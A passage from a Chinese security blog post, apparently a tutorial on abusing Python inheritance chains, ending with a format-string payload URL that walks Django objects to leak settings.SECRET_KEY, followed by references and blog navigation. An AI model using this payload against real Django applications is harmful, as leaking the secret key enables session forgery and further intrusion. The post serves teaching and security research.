+<p>拿到<code>EmptyManager</code>对象：<code>user._groups.__class__</code></p>
+<p>拿到<code>QuerySet</code>对象：<code>user._groups.__class__.__base__.__init__.__globals__[QuerySet]</code></p>
+<p>拿到SECRET_KEY</p>
+<p><code>{user._groups.__class__.__base__.__init__.__globals__[QuerySet].__init__.__globals__[settings].SECRET_KEY}</code></p>
+<p>所以最后的payload是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;search?keyword&#x3D;&#123;user._groups.__class__.__base__.__init__.__globals__[QuerySet].__init__.__globals__[settings].SECRET_KEY&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="pic.png" alt="pic.png"></p>
+<p><em>ps:有登陆的情况下构造过程中继承链的感觉更强烈，有兴趣的师傅可以试一下~</em></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a></p>
+<p><a href="https://www.anquanke.com/post/id/85571" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85571</a></p>
+<p><a href="http://www.cnblogs.com/iamstudy/articles/python_eval_and_bypass_sandbox_study.html" target="_blank" rel="noopener">http://www.cnblogs.com/iamstudy/articles/python_eval_and_bypass_sandbox_study.html</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>李三（cl0und）
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://yoursite.com/2018/04/24/%E7%94%A8python%E7%BB%A7%E6%89%BF%E9%93%BE%E6%90%9E%E4%BA%8B%E6%83%85/" title="用python继承链搞事情">http://yoursite.com/2018/04/24/用python继承链搞事情/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/python/" rel="tag"># python</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/04/08/opcache%E7%BC%93%E5%AD%98getshell/" rel="prev" title="opcache缓存getshell">
+      <i class="fa fa-chevron-left"></i> opcache缓存getshell
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/06/26/nginx%E7%9A%84%E7%A7%98%E5%AF%86wp/" rel="next" title="nginx的秘密wp">
+      nginx的秘密wp <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#基础知识"><span class="nav-number">2.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#bases"><span class="nav-number">2.1.</span> <span class="nav-text">bases</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#class"><span class="nav-number">2.2.</span> <span class="nav-text">class</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#globals"><span class="nav-number">2.3.</span> <span class="nav-text">globals</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#subclasses"><span class="nav-number">2.4.</span> <span class="nav-text">subclasses()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#builtin-amp-amp-builtins"><span class="nav-number">2.5.</span> <span class="nav-text">builtin &amp;&amp; builtins</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#继承链bypass沙盒"><span class="nav-number">3.</span> <span class="nav-text">继承链bypass沙盒</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#用file对象读取文件"><span class="nav-number">3.1.</span> <span class="nav-text">用file对象读取文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#用内置模块执行命令"><span class="nav-number">3.2.</span> <span class="nav-text">用内置模块执行命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第三种"><span class="nav-number">3.3.</span> <span class="nav-text">第三种</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#继承链读django配置信息"><span class="nav-number">4.</span> <span class="nav-text">继承链读django配置信息</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">4.1.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">李三（cl0und）</p>
+  <div class="site-description" itemprop="description">人若无名，便可专心练剑</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://7o8v.me/" title="http:&#x2F;&#x2F;7o8v.me&#x2F;" rel="noopener" target="_blank">7o8v☘️</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://evoa.me/" title="https:&#x2F;&#x2F;evoa.me&#x2F;" rel="noopener" target="_blank">evoA☘️</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://kkdlong.win/" title="http:&#x2F;&#x2F;kkdlong.win&#x2F;" rel="noopener" target="_blank">kkdlong☘️</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.l0ca1.xyz/" title="https:&#x2F;&#x2F;blog.l0ca1.xyz&#x2F;" rel="noopener" target="_blank">l0cal☘️</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.lmxspace.com/" title="http:&#x2F;&#x2F;www.lmxspace.com&#x2F;" rel="noopener" target="_blank">l1nk3r</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/iamstudy/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;iamstudy&#x2F;" rel="noopener" target="_blank">l3m0n☘️</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://8sec.cc/" title="http:&#x2F;&#x2F;8sec.cc&#x2F;" rel="noopener" target="_blank">裤衩哥的小屋</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://abcdefghijklmnopqrst.xyz/" title="http:&#x2F;&#x2F;abcdefghijklmnopqrst.xyz" rel="noopener" target="_blank">骑麦兜看落日☘️</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">李三（cl0und）</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="Symbols count total">153k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">2:19</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.1.1
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> v7.6.0
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
